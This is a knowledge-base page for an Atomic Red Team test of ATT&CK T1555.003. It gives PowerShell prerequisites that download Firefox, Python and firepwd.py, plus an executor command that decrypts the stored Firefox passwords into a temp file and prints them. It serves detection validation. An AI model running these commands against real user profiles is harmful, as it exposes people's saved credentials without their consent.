---
atomic_guid: "dc9cd677-c70f-4df5-bd1c-f114af3c2381"
title: "Decrypt Mozilla Passwords with Firepwd.py"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "dc9cd677-c70f-4df5-bd1c-f114af3c2381"
  - "Decrypt Mozilla Passwords with Firepwd.py"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Decrypt Mozilla Passwords with Firepwd.py

Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.
Upon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. 

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.

## Metadata

- Atomic GUID: dc9cd677-c70f-4df5-bd1c-f114af3c2381
- Technique: T1555.003: Credentials from Password Stores: Credentials from Web Browsers
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1555.003/T1555.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555.003]]

## Input Arguments

### Firepwd_Path

- description: Filepath for Firepwd.py
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py

### Out_Filepath

- description: Filepath to output results to
- type: string
- default: $env:temp\T1555.003Test8.txt

### Python_Path

- description: Filepath to python
- type: string
- default: C:\Program Files\Python310\python.exe

### VS_CMD_Path

- description: Filepath to Visual Studio Build Tools Command prompt
- type: string
- default: C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat

### venv_path

- description: Path to the folder for the tactics venv
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004

## Dependencies

Firefox profile directory must be present

### Prerequisite Check

```text
if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\" -erroraction silentlycontinue) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"
msiexec.exe /i "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi" /quiet
sleep -s 30
start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
sleep -s 5
stop-process -name "firefox"
```

Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}

### Prerequisite Check

```text
if (Test-Path "#{VS_CMD_Path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe"
write-host "Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe."
```

Python must be installed

### Prerequisite Check

```text
if (Test-Path "#{Python_Path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
```

Computer must have venv configured at #{venv_path}

### Prerequisite Check

```text
if (Test-Path -Path "#{venv_path}") { exit 0 } else { exit 1 }
```

### Get Prerequisite

```text
py -m venv "#{venv_path}"
```

Firepwd must exist at #{Firepwd_Path}

### Prerequisite Check

```text
if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}"
```

Pycryptodome library must be installed

### Prerequisite Check

```text
if (#{venv_path}\Scripts\pip.exe show pycryptodome) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
if (test-path "#{VS_CMD_Path}"){#{venv_path}\Scripts\pip.exe install pycryptodome | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq"}
```

Pyasn1 library must be installed

### Prerequisite Check

```text
if (#{venv_path}\Scripts\pip.exe show pyasn1) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
if (test-path "#{VS_CMD_Path}") & {#{venv_path}\Scripts\pip.exe install pyasn1 | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq."}
```

## Executor

- name: powershell

### Command

```powershell
$PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
cmd /c #{venv_path}\Scripts\python.exe #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
cat #{Out_Filepath}
```

### Cleanup

```powershell
Remove-Item -Path "#{Out_Filepath}" -erroraction silentlycontinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
